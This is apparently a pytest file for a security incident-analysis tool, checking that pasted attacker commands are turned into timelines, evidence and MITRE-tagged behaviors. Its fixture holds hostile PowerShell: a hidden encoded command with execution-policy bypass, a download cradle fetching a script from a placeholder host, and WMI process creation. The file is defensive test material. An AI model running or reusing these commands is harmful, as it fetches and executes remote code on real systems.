"""Rule R22 · Paste-Only Synthesis contract tests.

Verifies that raw-paste investigations produce the same canonical
shape (timeline, evidence, behaviors, acquired_document,
acquisition_plan) that EML / PDF / URL / DOCX / ZIP / Image cases
produce.  Frontend never has to special-case paste-only inputs."""
from __future__ import annotations

from services.die.investigation_results import render
from services.reasoning.paste_synthesis import (
    _needs_synthesis, synthesize,
)


PASTE = (
    """powershell.exe -ExecutionPolicy Bypass -w hidden -enc """
    """SQBFAFgAIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA=\n"""
    """iex (New-Object Net.WebClient).DownloadString('http://evil.tld/a.ps1')\n"""
    """Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList cmd.exe"""
)


# =============================================================================
# 1. Detection
# =============================================================================
class TestNeedsSynthesis:
    def test_paste_only_needs_synthesis(self):
        assert _needs_synthesis({}) is True

    def test_successful_acquisition_skipped(self):
        assert _needs_synthesis({"acquired_document": {"ok": True}}) is False

    def test_failed_acquisition_not_masked(self):
        # IDA-3 attempted a fetch and failed → do NOT synthesize a
        # fake ok=true acquired_document.
        assert _needs_synthesis({
            "acquired_document": {"ok": False, "url": "http://x",
                                    "error_code": "timeout"},
        }) is False

    def test_article_extractor_commands_skipped(self):
        assert _needs_synthesis({
            "report_extraction": {"commands": [{"command": "x"}]},
        }) is False


# =============================================================================
# 2. Full pipeline projection
# =============================================================================
class TestFullPipelineSynthesis:
    def setup_method(self):
        self.ssot = render(PASTE)["object"]
        self.inc = self.ssot.get("incident") or {}

    def test_acquired_document_synthesized(self):
        acq = self.ssot.get("acquired_document") or {}
        assert acq.get("ok") is True
        assert acq.get("source_kind") == "analyst_paste"
        assert acq.get("synthetic") is True

    def test_acquisition_plan_synthesized(self):
        plan = self.ssot.get("acquisition_plan") or []
        assert plan, "acquisition_plan must be present for paste inputs"
        # every step reports done because the paste IS the acquired content
        assert all(s.get("status") == "done" for s in plan)

    def test_timeline_populated_and_ordered(self):
        tl = self.inc.get("timeline") or []
        assert len(tl) >= 3, f"expected ≥3 behaviors; got {len(tl)}"
        # every event has a stable evt-#### id
        for i, e in enumerate(tl, 1):
            assert e["id"] == f"evt-{i:04d}"
            assert e["kind"] == "behavior"
            assert e["step"] == i
            assert e["behavior_id"].startswith("bhv-")
            assert "mitre_tactics"    in e
            assert "mitre_techniques" in e
            assert "kill_chain"       in e
            assert "evidence_refs"    in e

    def test_timeline_derived_from_behaviors_not_commands(self):
        tl = self.inc.get("timeline") or []
        # Analyst-facing labels are behavior titles, not raw commands.
        titles = {e["event"] for e in tl}
        assert any("Encoded" in t or "Base64" in t for t in titles), titles
        assert any("Cradle" in t or "Payload" in t for t in titles), titles

    def test_evidence_list_with_stable_ids(self):
        ev = (self.inc.get("evidence") or {}).get("behaviors") or []
        assert ev, "evidence.behaviors must be populated"
        for i, row in enumerate(ev, 1):
            assert row["id"] == f"ev-{i:04d}"
            assert row["behavior_id"].startswith("bhv-")
            assert row["source"] == "analyst_paste"

    def test_timeline_events_link_to_evidence(self):
        tl = self.inc.get("timeline") or []
        evs = (self.inc.get("evidence") or {}).get("behaviors") or []
        ev_ids = {e["id"] for e in evs}
        for event in tl:
            for ref in event["evidence_refs"]:
                assert ref in ev_ids, f"timeline event refs unknown evidence {ref}"

    def test_behavior_clusters_carry_stable_bhv_ids(self):
        clusters = self.inc.get("behaviors") or []
        assert clusters
        for c in clusters:
            assert c["bhv_id"].startswith("bhv-")
            assert "primary_tactic" in c
            assert "mitre_tactics"  in c
            assert "kill_chain"     in c

    def test_synthesis_is_deterministic(self):
        again = render(PASTE)["object"].get("incident") or {}
        again_tl = [e["id"] for e in (again.get("timeline") or [])]
        this_tl  = [e["id"] for e in (self.inc.get("timeline") or [])]
        assert again_tl == this_tl, "paste synthesis must be deterministic"


# =============================================================================
# 3. Non-regression — real acquisitions untouched
# =============================================================================
class TestDoesNotMaskRealAcquisitions:
    def test_ok_acquisition_untouched(self):
        ssot = {
            "acquired_document": {"ok": True, "url": "http://x",
                                    "source_kind": "static_html"},
            "report_extraction": {"commands": [{"command": "whoami"}]},
            "incident": {"timeline": [{"kind": "article", "event": "real"}],
                         "behaviors": [{"label": "already-real"}],
                         "evidence": {"commands": [{"command": "whoami"}]}},
        }
        out = synthesize(ssot)
        # Should be unchanged.
        assert out["acquired_document"]["ok"] is True
        assert out["acquired_document"].get("synthetic") is not True
        assert out["incident"]["timeline"][0]["event"] == "real"
        assert out["incident"]["behaviors"][0]["label"] == "already-real"

    def test_failed_acquisition_not_masked_by_synthesis(self):
        ssot = {
            "input": "https://never-resolves.tld",
            "acquired_document": {"ok": False, "url": "https://never-resolves.tld",
                                    "error_code": "timeout"},
            "report_extraction": {"commands": []},
        }
        out = synthesize(ssot)
        assert out["acquired_document"]["ok"] is False
        assert out["acquired_document"].get("error_code") == "timeout"
